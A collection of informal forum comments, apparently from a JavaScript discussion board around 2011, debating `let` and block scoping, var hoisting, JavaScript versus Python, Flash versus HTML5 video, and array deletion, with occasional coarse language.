Nope pretty sure pedantry was intended here, your original statement seemed to give the same impression you're applying to everyone else, that you really don't know what you're talking about. :)
I was agreeing with you, sorry if that wasn't clear.
The thing I linked is a purely functional implementation of `let`, it should work in any JS implementation. It isn’t a keyword, but you can write: let(some_expression, function (name-to_be_bound) { // ... }); It looks a little better in coffeescript: let some_expression, (name_to_be_bound) =&gt; # ... The implementation is fairly obvious. 
Oh, doh! I'll get one. http://iggyhopper.dyndns.org/Nezz.d2s For specs/reference. http://user.xmission.com/~trevin/DiabloIIv1.09_File_Format.shtml
Your example should look like this: if (foo) { let x = 1; // x is in scope // outer variables are too } if (foo) { with ({x: 1}) { // x is in scope // outer variables are too } } if (foo) { (function (x) { // x is in scope // outer variables are too }(1)); } `with` isn't often used like that though. &gt;There's no reason for with to be any slower [...] If you use `with` your code doesn't get optimized. It's like `eval` or E4X. It's a big fat mess. Feel free to contribute to V8 and/or Mozilla's JS engine if you think you can fix that issue.
That would be browser-dependent. Last time I played with those APIs though, the issue wasn't the performance, but that the API implementations were rather buggy in both Chrome and Firefox. Hopefully that's been improved since.
I don't think browser manufacturers have the same level of hardware acceleration support as Flash. On multiple machines, videos were lagging or choppy in HTML5 side-by-side with the Flash version of the same video. So my claims here are mostly based on my own experience.
I'm sorry I don't think I follow you. Are you saying a function with 2 let blocks is different than another function with 2 functions inside of that? I don't believe let will add any more scopes than adding a function inside of an already existing function; the variables declared there just don't have a parent in the scope chain to check.
Greenberg works (worked?) in the [flapjax group](http://www.flapjax-lang.org/index.html) at Brown, which was led by Sriram Krishnamrti. I attended some early talks about it several years ago. One of the neatest parts of flapjax is the reactive code-- with the ability to specify behavior similar to the way that the reactive extensions in drscheme and haskell. Thanks for posting the link.
You have a robot; this robot creates smaller specialized robots. Each specialized robot is identical in looks and functionality to the every other specialized robot except for a UPC code that was passed from the parent robot to the children. The specialized robots can turned on at a later time and can access the parent for their individual UPC code. ...was my attempt at a minified explanation.
&gt; but trying to explain Closures to someone who doesn’t even understand programming is near impossible to do. I think the author is mentally impaired. The above is like saying, "But, I can't even explain how to do surgery to someone who doesn't understand medicine!"
One's client side and one's server side. Do you really mean to compare these two languages?
Yes, JS does server-side as well, see: http://en.wikipedia.org/wiki/Comparison_of_server-side_JavaScript_solutions and Node.js is really taking off. From what I can gather in #javascript on IRC, these are the features JS has that Python doesn't: * prototypical based inheritance model * multi-statement lambdas * closures And I think, also: * function composition * currying * higher-order functions Advantages Python has over JS: * operator overloading (with the caveat that it can be done in V8). What else might JS have over Python, and what might Python have over JS? I'm sure there are more than just this.
1) Python doesn't need anonymous functions; you can create functions at any scope. They are also first-class and can be passed around. Functions are objects in Python, just like everything else. For example (http://codepad.org/Lti4u35V): def mul(a, b): return a * b def g(f): print f(2, 3) g(mul) Python's lambda keyword only allows expressions, but that's okay, because it's so rarely useful. It basically makes people migrating from CL/Scheme feel a bit better about life. 2) Twisted. Not even going to bother going into this. 3) Pip and virtualenv replace NPM. As far as modules go, Python has modules built into the language, and allows you to introspect and dynamically handle modules far above and beyond what CommonJS gives you. If you think Node gives you good asynchronous tools, you really should check out Twisted, the *inspiration* for Node: http://twistedmatrix.com/
What? Since when does JS do composition and currying? It's possible to do this with libraries, but it's not built-in like Haskell. Depending on how you define higher-order functions, arguably Python has them. They aren't super-useful in Python because functions don't capture scope in the same way, unless you use the 'nonlocal' keyword. And in the end, such trickery is just non-Pythonic. They'd prefer you return a Functor if you really want that kind of behaviour.
They both fucking suck.
Why not link directly to the site, rather than a screen shot of it?
Colour me corrected. I had heard of Node.js, but never looked into it.
I find it interesting that the "better version", while certainly better, declares `Prev` as not only a global variable, but also with a capital first letter, which typically denotes a constructor.
And without a "var" at that!
Right, like I said... Global variable...
also: == undefined 
I assumed the "WTF?" applied to the original code and that the "better" version made it a "WTF?!"
Not only what has already been pointed out... if this is the bit that takes the cake then I'm envious of you. It takes far more for my jaded self to say WTF these days. It's bad, yes. It's not THAT bad compared to the utter crap that is in the wild, though.
I'd go as far to say it's not bad at all. It's certainly sub-optimal, but it is at least correct and doesn't have any unwanted side-effects or cause any spooky action at a distance, unlike the supposedly "better" version which uses a global variable.
What added layer? Browsers cut a hole for plugins, allowing them to render directly. This is part of the reason why they sometimes don't integrate well into a page. Adobe also added the ability to have video on the bottom layer, outside the display list, as it works better on the GPU, and significantly improves performance (especially on Mac OS where performance was often bad before). It's the investment Adobe have put into playing video which is why it's often better then HTML5.
That wasn't nearly as bad as I expected from the title.
I meant an extra layer of code. The plugin can't run as fast as the browser and can only access the OS indirectly. But maybe you're saying that once the video pipeline is established that doesn't matter?
For example: var outsideVar = "I'm outside the function :D"; function demo() { if(something) { var innerVar = "new!"; outsideVar = innerVar; } } Before let was introduced, the program would only have to check 2 scopes before it found outerVar, whereas now it will have to check 3. (even if the word let never actually appears inside the program).
Why can't a plugin run as fast as a browser? I expect the video code in Firefox, Chrome and Flash is written in C++, and are compiled with modern compilers. There is also nothing to stop the Flash runtime making calls to the OS.
&gt; There is also nothing to stop the Flash runtime making calls to the OS. It should be sandboxed.
What your Flash app can do, that's sandboxed, but not the runtime.
Ah right, of course. &lt;goes off to uninstall Flash&gt;
You might want to uninstall your web browsers too; their design is no more or less secure then Flash.
Hmm, do you work for Adobe by any chance? Flash has security issues coming out of its ears.
Yes, that's what I meant: the time it takes to look-up the variable. Many times your code is not running from global scope. You have nested functions (eg. "private" methods) and OOP/namespaces with public methods. 
No, it's just silly to say your getting rid of a plugin simply because it can efficiently run video. &gt; Flash has security issues coming out of its ears. If you look at the security statistics for the last few years, you'll know this isn't really true any more. For example these days Java is the main target for attacks on security.
For some reason I had in my head that Flash used an extension rather than a plugin model, so was sandboxed by my browser. It's true I haven't seen quite so many Flash security alerts lately but it does bother me that any piece of content out in the wild could potentially use an unpatched flaw in Flash to access everything on my computer. With Java I at least get a notification that it's about to run. I won't really uninstall Flash due to the large number of sites still using it to deliver video, but I will look again at ways to enable it selectively.
There is some sandboxing, but this is mostly standard stuff provided by the OS, which the browser is just taking advantage of. For example it's common for plugins to now be run in a separate process, which restrictions the ownership of resources (such as windows), and prevents access to memory.
Guys, your comments have been replied in the original post. 
I was writing a quick example when I realized the jQuery documentation for the change() function already has an example of exactly what you'd like to do I think (assuming you're using jQuery) http://api.jquery.com/change/
You need to set up a handler for the *onchange* event of the select box. This handler needs to determine the currently selected entry and update the div element accordingly. Have look at [this example](http://jsfiddle.net/j6nnp/) that I created for you. The example uses jQuery to make things easier and work across browsers. 
I hoist variables in the beginning of each functions. Therefore, no var in that if...else scope as I type my alternative. Habit I guess? As for the == vs ===, c'mon, I missed it okay? Doesn't make me deserve a "WTF?!". At most it should be a "WTF...?".
Since this isn't the /r/jquery subreddit, we should probably give it to him in plain ol' javascript. Selection boxes are considered arrays. For that, to get the value of the selected item, you need to determine which one is selected in the index of the array. You do this by the .selectedIndex property. &lt;SELECT id="myselect"&gt; ... then after it, add JS to the HTML: var selectmenu= document.getElementById("myselect") selectmenu.onchange = function(){ var option_chosen = this.options[this.selectedIndex]; alert (option_chosen.value); } You can also simply target the function another way: &lt;SELECT id="myselect" onchange="showMe();"&gt; Then, in JS: function showMe(){ var my_select_box= document.getElementById("myselect"); var option_chosen = my_select_box.options[my_select_box.selectedIndex]; alert (option_chosen.value); } Essentially, you add the ONCHANGE event listener, so that any time the select box changes, you can get easily get the new .selectedIndex of it, which will tell you the .value, .text, etc. that you need for work elsewhere.
upvote for sanity
If we are talking server-side: node.js and the like do support coffeescript, no need to compile here. Browser-side, I use some thin rack application to deliver my code and that does all the compilation to javascript. See here for a game from me that does exactly that and is also easy deployable to heroku: https://github.com/TomK32/typedown
Maybe you need to put on your big boy pants [and read the fucking spec](http://ecma262-5.com/ELS5_HTML.htm#Section_11.4.1) before you think you can just start writing code in a language you don't know.
Cry me a river… Since when is the internet friendly and fair? Just ignore those people.
Yeah that's a great way to prove your point, ask me if I've ever written code. Let me get you up here on the podium of argumentative excellence and wrap that gold medal around your neck. Bravo champ. Only a fool thinks that they can write code one language and it will work exactly like code in another language. Only a moron thinks they can use an operator that deletes a **property** from an *object* on an *array* **element**. This has nothing to do with me reading the spec, it has everything to do with the article's author coming in screaming about how awful the language he doesn't understand is.
What a knob.
TL;DR "if you want to remove shit from an array, don’t use delete". No shit, Sherlock. 
It is sort of javascript's fault for blurring the distinction between an array and an object.
I think a big reason why you got semi-flamed is because the code you originally shared that "takes the cake" was somewhere in the "meh" portion of the WTF scale. Most of us here would have fixed it without batting an eyelash. We see way worse WTFs every single day. Read the daily WTF. How does your WTF compare? Keep in mind that we're also talking about JavaScript: the language that every web dev is expected to write in most web dev shops in addition to the language they think they're writing (PHP, C#, etc). Most JS that's written is utter garbage. Since, in the grand scheme of things, there wasn't much there to really fix, the difference in WTFitude of the original and the fixed one was tiny. Why leave things like capital letters for variables as a tribute? You're supposed to be fixing it, not parodying it. Did you do that in the original source, too? Are the really obtuse variable names part of the original source, or obsfucation? WTF is "ot"? Why wasn't THAT fixed? Basically, you came on here bashing a programmer that, to put an arbitrary number on something that can't really be given a number, we'd give a 7.6. Your replacement is a 7.7. Original dev doesn't seem to deserve a public bashing from someone that still seems to get a C. Maybe our judgement of your code was snap. Maybe in production code you really would have not used a global, or would have fixed the casing. Maybe "ot" is just you obsfucating the code. But guess what? You're the one on here ranting about code quality. You better believe that it's on your shoulders to make things like that clear. The "rebuttal" just makes you seem like you can't take criticism. I felt somewhat bad for how you were treated in the original post. I tried to keep my reply civil. I feel significantly less bad now that you've gone and gotten insulted and written a semi-inflammatory blog post.
Hrmm, I'm genuinely curious because I'm working on something related to that, but could you elaborate on where the confusion arises? Why might someone make the mistake? Honestly I know my last two posts were harsh but this is a genuine interest.
Thanks for the specs. Now can I have some big boy pants too?
Put simply, most of javascript's innards are defined as "objects", which are essentially mappings. Arrays are a particular js type, but underneath the hood they're just js objects with integer keys (even this isn't quite true because the keys will often manifest as strings like "0", "1", etc). This leads to some oddities such as the ability to have non-sequential elements in an array.
I'm confused as how you come to a conclusion that I am screaming about Javascript when I consider myself to be a massive NodeJS advocate and evangelist here (not to mention the organizer of NodeHack, a NodeJS event in Malaysia). I was just pointing out the new stuff that I learnt from fiddling around with some weird algorithm, and I honestly believe that no matter how "good" you think you are in a technology, there's always times when you go WTF, why didn't I know this basic shit at all? So no, this is not WTF Javascript, and more WTF soggie you idiot, why you no understand basic shit?
Note: I am not primarily a JS dev. I'm a web dev who takes an interest in doing JS better than the average web dev. If I understand it correctly, from a technical standpoint there is no difference between an array, an object, or a "hash" (for lack of a more language-appropriate term). They're all just key/value stores. They act a little differently if your keys are numeric. For instance, the following is perfectly okay, technically: &gt; var a = [0, 1, 2]; &gt; a [0, 1, 2] &gt; a.foo = 'yes' "yes" &gt; a [0, 1, 2] &gt; a.foo "yes" A numeric array, a hash, or an object comes down to how you choose to use it, and nothing forces you to stick to only one way except for personal coding standards.
&gt; underneath the hood they're just js objects with integer keys Do you remember where you read/learnt this? If you take a new array such as... var x = []; x[3] = 1; And you inspect x you'll see: [undefined, undefined, undefined, 1] Where as, with an object... var x = {}; x[3] = 1; Inspecting x results in: {3: 1} The other thing is that arrays will ensure order if you iterate over them (ie, 1 always comes before 2), but an object doesn't ensure order and you'll get things like 2 comes before 1 (as you've mentioned). Would you say a big part of the confusion is the "typeof []" === "Object" thing? Or was is it something else?
Interesting one. I actually did the exact same thing on formatting results from CouchDB. In your case however, you might not want to do it that way because it will fail in for( ... in ...) loops. for (var i in a) console.log(a); // a.offset will show I did this instead: Object.defineProperty(a, 'foo', { value : 'yes', enumerable : false, writable : true });
Look at the title of your posting. "WTF Javascript" is literally in it. As well as "why you make no sense" implying that the fault is with JS and not with you.
I wouldn't do it that way mostly because I don't advocate blurring the lines between something I'm treating as an array and something I'm treating as an object. You'd never see code like what I posted being written by me except as what that was: pointing out how arrays can be used as key/value stores technically, and why that can be considered to be blurring the lines between objects and arrays.
Maybe I should start sharing more of the kind of WTF code we have to suffer through on a daily basis, 1 year after that developer left the office. You're right for me over-reacting to what must be expected responses from battle-hardened developers from trenches of bad code. I hereby rest my case then, and make a mental note to scour the code base for a scale 9.9 WTF code (although I must say, that might be a little difficult considering most of the stupidest code have been refactored back into the dark voids of nightmares) to share on reddit next time. I'll be back. PS: In case my english fails me, there is no sarcasm intended in this post. PSPS: the short forms, oat, etc, are actual acronyms to aviation terms. OAT (outside air temperature), ws (wind speed), wd (wind direction), and is so because (1) they are standard in our naming convention and (2) its easier to write when you're writing a long formula (and trust me, the formulas are friggin' long).
Yeah, they don't behave exactly the same, for sure. But js arrays also don't behave like arrays in any other language I know, and as I understand it (I heard it a long time ago when I was first learning js) the reason is because they're implemented as objects under the hood.
Yup, domain-specific acronyms are OK in my book as long as they're generally recognized in your domain and you accept that when/if you hire a developer that's NOT versed in the domain language that you'll have to train them. Domain-specific acronyms don't post well to the Internet, but I personally believe that they can be fine. I also use 'i' for indexes, too, so what do I know? ;)
Yeah the primitives are all wrapped in objects, which can be extended because the OO model is prototypical. I think the big issue here is a realization that objects are mutable after being created. Arrays are objects, so you would have the primitive "array" of data as per a typical array, but you have the object wrapper that lets you deal with it, for instance, [undefined, 1,2].length, where length is part of the array object, as are methods such as .slice. You can add your own methods/properties to the array object, so if you wanted to create [].foo, you could do that in the same way [].slice can be re-defined, and you can actually extend objects via the prototype chain, so lets say you want that really cool ECMA5 feature that came out recently that IE8 doesn't support called [].map, well, you can actually just do Array.prototype.map=function(){/*...code that does a map...*/} and now you have legacy browsers compatible with future features. Another way to actually "see" the differences between objects and arrays is by iterating over it and doing performance test. So, an array of [1, 2, 3] can be iterated over up-to 90% faster than an object of {"0":1, "1":2, "2":3}. The other issue is when you add a method/property to an object (or array object) that property can show up when doing a for (x in y) style loop, where you should really be using y.[hasOwnProperty](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/hasOwnProperty)(x) inside an if statement or you'll end up passing it into your normal logic. Array === fast, Object === slow, Object === might pass a property that isn't it's own. I'm looking for a good way to explain this distinction.
Interesting about the performance difference. I guess Array has code paths available to it which won't work with a general object. I'm actually surprised by your earlier example that typeof([]) === 'object' cause Array really is a special object type.
Well they really tried to get typeof [] to come out as array in the latest version of the standard but it would break too many legacy apps so they didn't. There's an object that wraps everything, including numbers, if you do (1).toString() you can see that it has a method call on a "number" type, it's because objects are mutable through that prototype that you are permitted to abuse an array to store object properties as if it were an object. I'd say check out the v8 source code but it's fairly complex with type-specializing and the JIT compiler... if you can find a more simple JS engine, perhaps [a legacy version of SpiderMonkey](http://ftp.mozilla.org/pub/mozilla.org/js/older-packages/), the source code would show you how objects/arrays get dealt with. The file that describes an array being roughly 1300 lines and the object file being roughly 3000.
A proper response to the WTF comments would have been "ah, don't worry, I just skipped out the 'var Prev' for brevity" or "of course, silly me, thanks!". Writing a second blog post complaining about people pointing out what was a bug in your original code, is not the correct strategy to take, especially when they were right.
Your fixed code suffers from the same flaw as the original. Your issue is that the original WTF accesses Legs[t-1] 8 times, and so you fix this by storing it once in the Prev variable. Yet you continue to access Legs[t] 6 times, and fail to fix this. People in glass houses shouldn't throw stones.
You know, ranting in response to discontent about a posting you did isn't really helping yourself. If you feel what you did was correct with reason and valid for that use-case, then argue it constructively. You're just telling people to not visit your blog since it (could be mostly) about ranting rather than JS.
My attempts at humor fails epically. :(
Yeah, who'd think delete would remove something. Fucking n00bs
delete is to remove a property of an object, if you want to remove an element in an array you have to use splice (splice, not slice). var a = [1,2,3]; a.splice(0, 1); // Remove element(s) from index 0 and remove 1 element That's how you remove an element from an array. See this for full reference : https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/splice
Well, in js delete is kind of a niche command. It's specifically for removing an item from an object, and you don't even need it because you can just set the property to undefined.
Setting the property to undefined doesn't changes the length of the array, which in some cases is preferable. In this case, I was expecting delete to actually alter the length of an array, which unfortunately was incorrect. So, lesson learnt, new knowledge about how JS works underneath the hood, and everybody's happy, eh?
You need it if you don't want the element to still show up in a for(... in ...) loop. var a = {a : 1}; a.a = undefined; // in a for(... in ...) "a" will STILL show up as an index And if you do delete : var a = {a : 1}; delete a.a; // "a" won't show up as an index in a for(... in ...) loop. 
Good point. How would you have done it then, considering that we can't just set Legs[t] = Prev, because we're not exactly copying the entire item. var prev, curr; curr = Legs[t]; if (undefined === curr) { curr = this.defaultLegsObject(); prev = Legs[t - 1]; if (prev) { curr.ot = prev.ot; // ... etc } Legs[t] = curr; } This the best way? Or am I totally missing the point?
I do not put my vars at the top of a function, I prefer to keep them close to where they are used. I have been coding javascript every day for the past 15 years, professionally, working on huge javascript projects (&gt;80,000 loc) and I have never once encountered a problem caused by where I had put a var. Not once. I am aware of how var works, and I am aware of strong opinions about how people think code is best written, but the point you are trying to make is more about style fetish than any problem with javascript. I challenge you to come up with a piece of code that would fail depending on where the var is located.
You might have been able to use .pop().
or shift(), slice(), splice(). slice() tends to always be the first that comes to mind for some reason.
Ah, I didn't know that - thanks.
YUI compressor is my choice because it is already a part of bundling plugins like WRO4J, which will 'bundle' scripts or css together to reduce the numer of HTTP requests made while loading 10 or 20 script files. This is the other huge bottleneck when dealing with complex web apps that use a lot of javascript files. Combining all the scripts into one YUI minified and gzipped file is an important optimization that can really speed your web app load time.
Yes that is better, and yes I think you have missed the point. 'Best way' is not what I was getting at (the original with all it's array access was good enough). My comment is that you complain about a problem in the code whilst making the same complaint yourself. It's hypocritical. Separately, I'd personally define 'prev' at the top of the if statement rather then the function, as it shows that 'prev' is only used there, and no where else.
It's been there from day 1.
Being pre-bundled really helps workflow, and it's worth trading a couple of hundred bytes for that. But there is nothing to stop you building a similar with the closure compiler, where scripts and CSS are bundled together into one file.
&gt;I am especially looking forward to seeing some of these features landing up on V8 soon, so that I can use it on node.js. Yea, Node will be probably the first place where you can actually use this stuff in production.
No arguments on the hypocrite part. So you're not a big fan of hoisting then? I used to go with the same logic but recently converted to forcing myself to hoist all variables so that I know what names are being used at all times. Avoids the pitfall of accidentally recycling a variable name, which at times can be quite confusing to debug when you have multiple callbacks and closures in that particular function.
I can see the reasoning behind it, but no I'm not a fan. In an ideal world all functions should be very short, and I can see hoisting working well then. However in practice it's pretty common for functions to grow into large blocks of code, and moving the var's down the scope as far as possible helps to visually localize the behaviour inside the function. For example it would be much easier for me to delete that whole section, or re-write it. I also find the issues you cite to be pretty rare, especially if you use an editor which highlights all of the places that the current variable is used, as then it's easier to spot that you are accidentally re-using a variable.
&gt; After getting whipped left and right in my delightful reddit share, turns out the above code is pretty shitty too, and the proper code should actually look like this: Good job, fella. Much better.
Your point about server-side execution completely hits the mark. Your point about client-side completely misses the point. It is not the CoffeeScript code that is interpreted, but the compiled JavaScript. That means if there is a bug in the logic it is evident in the execution of the JavaScript before it is evident in the CoffeeScript, which is horrible because you did not write and do not maintain that JavaScript.
Just pimping: [r/node](http://www.reddit.com/r/node/).
I thought I tried posting it there and it just got zeroed.
I think syntax errors are more common with javascript and the readability of coffeescript allows easier understanding of the code's logic.
These are all really useful constructs that should help to make code clearer and less cluttered. Looking at the list, it occurs to me that Python - apart from being an awesome language in its own right - is a very useful vehicle for taking ideas from less popular languages and disseminating them into the mainstream.
If you've been working with js that long and are aware of how it works I'm sure you can get away with it. I'm sure I could as well, but I don't see the point to doing so and I've experienced the harm. Why would you not have your code reflect what's actually happening? It's not a particularly odious style convention. I think it looks ugly but it's also clearly a good idea to increase how robust and maintainable your code is when it's being worked on by many people. The most common place I've seen it bite people is when doing something like ... updatePosition: function(input) { var position = that.getPosition(); doServerSideCalculation('foo', 'bar', function(result) { var x = position.x + that.margin; var y = position.y + that.margin; ... var position = [x + result.deltaX, y + result.deltaY]; position = that.normalizePositionData(position); that.renderPosition(position); }); }, ... It's pretty obvious that in "var x = position.x + that.margin" position is undefined if you know about hoisting but many people don't or just forget because they write in other, more designed languages. I guess to solve this you could have a style convention that disallows shadowing variables and have that called "newPosition" which is naming that i prefer anyway but that's pushing a style convention to hide a problem that is caused by var hoisting. Why not just have your style convention be "write code like javascript will make it anyway, and then you smart people won't make the mistakes of having to always watch out for it". Honestly I'm surprised by the reaction here to this point, of course you could still write correct code without following best practices. And not thinking it necessary is one thing, but defending var hoisting itself? Who on earth does that? No one working on the language spec thinks it was a good idea. I think declaring the variables at the beginning of a function looks stupid and ugly, but it also has a high likelihood of decreasing errors being introduced so I do it, because my job isn't to crank out lines of code like a script kiddy, it's to design software that will be easy to maintain and as robust as possible. I'm curious how you handle this? Do you disallow variable shadowing and always have unique names? Do you never have anyone working on the code who you haven't quizzed on the weirdness of javascript var hoisting to make sure they understand it? Honestly if I didn't think it was necessary I would love to not have that declaration noise at the beginning of my functions. 
I hear this "ajax" thing is hot these days too!
Looking at the asyncEach method I am confident you in fact do not understand what asynchronous means. I suspected as much, because I figured a schema validator could only be CPU bound. If it truly were asynchronous, other code would be able to execute at the exact same time. The use of a callback on error (even if used to stop the validation process) does not imply it's asynchronous, it only implies you're using callbacks. So unless you plan to hook into webworkers (which would be silly) I would stop calling it asynchronous. Unless I'm missing something, but I'd happily stand corrected.
i see your point, good example. It is messy code, and that bug would be pretty easy to spot I think, but maybe not for someone with little or no experience in programming. I try to avoid anonymous functions like the one in your example, so It's not as likely that my coding style would produce that particular bug. The use of variables in your example is also not something I would likely do, though I could see it occuring from a copy and paste situation, but I would be looking out for unusual bugs in that case. Variable name collision is always at the top of the troubleshooting list, so I don't see that it would be too easy to make the mistake in the first place. 
This appears to test for exclusion but not for inclusion. In other words if I failed to include a required property then it present a validation error, but what if I include all kinds of garbage that is not supposed to be there? How does this test of unexpected extension? It also appears to be missing tests for relationship, such as required child y of parent x or expected enumeration of reusable property y from required parent x.
Sorry, you are just flat wrong about #1 evens_only = filter(lambda x: x % 2 == 0, collection) Couldn't read any more after that. 
Python has: generators, decorators, introspection, operator overloading (like define __call__), list comprehensions, named arguments, enforced arguments (you can't simply omit ordered arguments), and strong typing. Javascript has: object literals. (pretty powerful, imo) 
Cool but nothing mind blowing. Can someone expand on why using let is useful?
let [a,b,c,d] = "This is a string".split(' '); As a basic usage I've sometimes used.
See: http://www.reddit.com/r/javascript/comments/mm684/it_has_been_5_years_why_can_we_still_not_use_let/ Unlike `var` the variables are block scoped instead of function scoped. So, you can create new variables inside some loop/branch/whatever and it will only exist inside that block (the part enclosed with curly braces). You can then borrow a best practice from Java, C#, and so forth where you declare a variable on first use.
Confusing example. You're showing off a destructuring assignment which happens to use `let` instead of `var`.
I now see where you are coming from, but i'll take this minor annoying style requirement over having to avoid anonymous functions (the *only* part of javascript that is better or as good as the other languages I use frequently) and having to worry about name collisions or manually checking this kind of thing. Especially when I am working with or managing a larger team of devs and I can dictate a style guide. Its just the simplest solution for now until we get proper scoping with let ... I all of a sudden realized I am assuming that let is both block scoped and *not* hoisted to the beginning of the block. Oh god I hope I'm right.
There's a really good presentation here: http://www.slideshare.net/dmitrysoshnikov/falsyvalues-dmitry-soshnikov-ecmascript-6 Goes into a lot more detail on each of the items.
List comprehension? LIST COMPREHENSION? Yeah!!
I want a sophisticated way to deal with "same origin" issues and cross-site-scripting! This is the #1 technical flaw with javascript and the DOM. AFAICT, this latest version still doesn't address it at all.
Could you share where the documentation is that says not using let will create extra scopes in your program? I've never read that anywhere; if it does I'd like to know. I'm under the impression your code is hoisted before it's ran. During hoisting the engine will be able to tell exactly how many scopes to create. It probably stores the number of scopes during the hoisting. If it doesn't find let during the hoist, how would it get included? Just because there is the *possibility* of 3 different kinds that doesn't mean it **always** checks 3. That's not how scoping works at all. There are *instances* of the different types of scopes, and that is what counts. (*global* being a singleton, *function* being many, and *let* being many). Functions don't have to try to look into each other, the scope chain is basically a linked list. It checks an array of variables on that object, then looks at a pointer that says this is my prototype and it goes to that object and checks that array until it finds null for a prototype.
let was even in logo[1] (not mention lisps[2]) earlier than that i suppose. Bignums was introduced in 1970, coroutines, multiple values, generalized variables, keyword&amp;optional&amp;auxiliary arguments in 1978. Et cetera. [1] http://en.wikipedia.org/wiki/List_of_Logo_Commands#let [2] let in ancient maclisp dialect: http://maclisp.info/pitmanual/contro.html "MACLISP is a dialect of the LISP Programming Language that ran on DEC PDP10 and Honeywell Multics in the 1970’s and early 1980’s. " -- http://maclisp.info
It seems like a lot of work for only a simple test. And with a more complicated plugin, you would have to add even more test code. Maybe even more than the original code that you're testing. With code like a zebrafier, looking at the generated code is a lot faster and problems could be spot immediately. I suspect this is the same with more complicated plugins. Does anyone have experience with the usefulness of Jasmine in real situations, and if it's worth the effort?
About this : &gt; let [x,y] = [3,4,5]; // x=3, y = 4 Does it mean that it's now possible to do this to swap : x, y = y, x ?
Does somebody know what this does ? var firstName = "Jack"; var message = `Hello ${firstName}!`; firstName = "World"; console.log(message);
Is that some kind of trolling or do you really advocate making the life of maintainers so hard ?
Some of these things are already present in Firefox. Look at 1.7, 1.8 and 1.8.5 here: https://developer.mozilla.org/Special:Tags?tag=JavaScript_version_overviews
I think your heading a bit to far ahead. You're trying to get started with web design yeah? Having only a little understanding of HTML and CSS won't get you far if your not being patient and understanding about the languages. By reading your post I can assume you don't know much. And then trying to learn a language like Javascript, you won't get far. Learn HTML. Learn how to use it. Learn how to code Semantic with HTML. ... "Should I use a &lt;div&gt; or &lt;h1&gt; for the top header?". Then you take the next step to CSS. Learning the syntax and each properties and values. Slowly make your way to JavaScript, also don't try to learn the Framework first. Trust me, I tried to learn jQuery and It was hell. I went with learning raw JavaScript and now I understand how to code better, with better understanding with jQuery.
Thanks for the feedback! This should be fixed now ([d20fc6eb83](https://github.com/Baggz/Amanda/blob/master/src/amanda.js#L91-134)).
Ehm.. no this is not fixed at all. Did you know javascript code never executes in parallel? Just stop calling it asynchronous :)
&gt; In other words if I failed to include a required property then it present a validation error, but what if I include all kinds of garbage that is not supposed to be there? In this case you can make use of ‘additionalItems’ ([#14](https://github.com/Baggz/Amanda/issues/14)) or ‘additionalProperties’ ([#13](https://github.com/Baggz/Amanda/issues/13)). &gt; It also appears to be missing tests for relationship, such as required child y of parent x or expected enumeration of reusable property y from required parent x. Actually, Amanda checks for required children, see http://jsfiddle.net/CcJ8K/3/. Let me know if you meant something different. 
Same example in the article though, right?
let respects block scope. var only respects function scope. That should be pretty self explanatory.
Probably not safe to use them in production yet, though. I mean, we're just barely dropping support for IE6 now.
My pretty solid guess is that it logs "Hello Jack!" I say this because I believe the `` embedded variable syntax to work as syntactic sugar on top of concatenation, rather than changing the internal memory structure for strings such that it holds references. Additionally, this is how other languages that implement similar functionality also work :)
Yep. Being in Firefox means it's convenient to give it a whirl, but that's about it. There aren't many people who're working on some Mozilla-platform-based stand-alone application. The people from ActiveState could use it in Komodo for example. And... uhm... yea... that's the only example I got. (If we ignore the obvious "if you're working for Mozilla..." one.)
Java or JavaScript? "Thinking in Java" is a book I enjoyed when I learnt Java. For JavaScript there's always "The good parts".
this guy is going to be pissed off about his work when they change the ECMA script standard to support a lot of the stuff he is doing here :)
&gt;you're not being forced to [declare variables at the top of your functions] Oh, of course you are. There are code conventions in place and you must adhere to them. Getting rid of this particular rule won't happen. Since we used it for quite a while we're all aware of its benefits. Seriously, not doing this is just crazy talk. It's like saying that nobody forces you to watch left and right if you cross a street. While that's right - *technically* right, that is - it's a pretty foolish suggestion.
The [same origin policy](http://en.wikipedia.org/wiki/Same_origin_policy) always applies -- you cannot access content in an iframe unless it's from the same origin as where your script executes. To do what you want to do (assuming that you don't have access to run scripts in the same domain of the content) you would have to write a userscript (Greasemonkey etc.) or a browser extension. It's not possible through straight JS. 
`[x, y] = [y, x];` Like that.
This is the part where you are flat wrong. You: &gt; In python, you have to define the functions first Reality: evens_only = filter(lambda x: x % 2 == 0, collection) 
edit: also, since we have generators and decorators, we can do this (from twisted): @defer.inlineCallbacks def someFunction(): a = 1 b = yield asyncFunction(a) c = yield anotherAsyncFunction(a, b) defer.returnValue(c) 
Wow dude, you really can't take being wrong can you? I don't think you can be a mature programmer (or anything) with that attitude. All I've done is point out that you can, indeed, use python functions inline. The argument that lambdas are not powerful enough is valid, and one that I would agree with. But it is not the same as "Python has no anonymous functions", which is, again, simply wrong. The proper response should have been: &gt;"Ok, you are being a bit pedantic, but you are right, what I mean to say is that while python DOES have anonymous functions, they are crippled, while in javascript they are just as powerful as any other function" Instead all you have is nasty, childish behavior, implying that I have no experience or that I don't understand. This speaks of immaturity. As far as twisted goes, you asked for a simplified example of continuations in python. The example I gave is exactly that. (please rewrite in javascript and see what you think) It doesn't really matter if you think twisted code is hard to maintain, I don't need twisted to use inline callbacks. Python is what we are talking about, python is what is supplying the generators and decorators. I'm trying to do my best to stick with the actual argument at hand (instead of personal attacks and insults) but I will say that i have, right this very moment, 100s of thousands of users being served, in production with twisted **and** nodejs servers. 
I know what you're saying. But as I said, I hit a wall. If I'm going to be making tens or hundreds of websites to improve my web development skills I'd rather make 100 functional sites than 1,000 that are just pretty geocities pages. I think once I get the trifecta working I can really start to refine my website planning. Then I can work to balance HTML, CSS, and JavaScript and figure out how to use each the best. However, your feedback is appreciated and I'll certainly be continuing to evolve my skills with HTML and CSS.
Well, there's Heroku. Webfaction also has (unofficial if I recall correctly) node.js support.
Do you know any other programming languages? Maybe this will give you a start. The code is the same as: i = 0; while (i &lt;= 1) { x = i; y = i * i; i = i + 0.1; } The assignment to the x and y variables will be executed multiple times by the loop. The first time, i will be 0 so x will be assigned the value 0 and y will be assigned the value 0 times 0. Then i is bumped to 0.1 and the contents of the loop is executed again. Then again for i = 0.2, then 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, and finally with i equaling 1. x and y are set again and again, paving over previous values so only the last loop iteration is going to matter. x will be set to 1 and y will be set to 1 times 1 (i.e. still 1). Then i is set to 1.1 and the loop says, "uh oh, that's not &lt;= 1. so it skips out to whatever code comes after the }. Make sense?
